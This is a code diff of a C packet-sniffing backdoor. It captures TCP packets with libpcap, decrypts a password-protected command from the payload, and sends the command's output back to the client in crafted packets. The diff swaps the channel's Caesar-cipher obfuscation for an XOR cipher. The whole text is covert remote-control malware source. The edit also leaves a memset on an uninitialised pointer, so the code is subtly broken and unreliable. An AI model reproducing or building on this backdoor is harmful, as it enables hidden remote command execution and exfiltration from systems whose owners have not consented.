@@ -132,7 +132,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	int mode;
 	//printf("Packet received\n");
 	char password[strlen(PASSWORD) + 1];
-	char decrypted[PKT_SIZE];
+	char * decrypted;
 	char * command;
 
 	ip = (struct ip_struct *)(packet + SIZE_ETHERNET);
@@ -161,10 +161,10 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 
 	/* define/compute tcp payload (segment) offset */
 	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
-	printf("Encrypted: %s\n", payload);
+
 	memset(decrypted, 0, sizeof(decrypted));
 	/* Decrypt the payload */
-	strcpy(decrypted, ConvertCaesar(mDecipher, (char *) payload, MOD, START));
+	decrypted = xor_cipher(payload);
 	
 	printf("Decrypted: %s\n", decrypted);
 	memset(password, 0, sizeof(password));
@@ -261,7 +261,6 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 
 	char cmd_results[PKT_SIZE];
 	char packet[PKT_SIZE];
-	char encrypted[PKT_SIZE];
 	char src[BUFFER];
 	char dst[BUFFER];
 
@@ -281,12 +280,10 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 		sprintf(packet, "%s %d %s%s%s", PASSWORD, CLIENT_MODE, CMD_START, cmd_results, CMD_END);
 		printf("Packet: %s\n", packet);
 		//Encrypt payload
-		strcpy(encrypted, ConvertCaesar(mEncipher, packet, MOD, START));
 		
 		//Send it over to the client
-		send_packet(encrypted, src, dst, dest_port);
+		send_packet(xor_cipher(packet), src, dst, dest_port);
 		
-		memset(encrypted, 0, sizeof(encrypted));
 		memset(packet, 0, sizeof(packet));
 		memset(cmd_results, 0, sizeof(cmd_results));
 	}
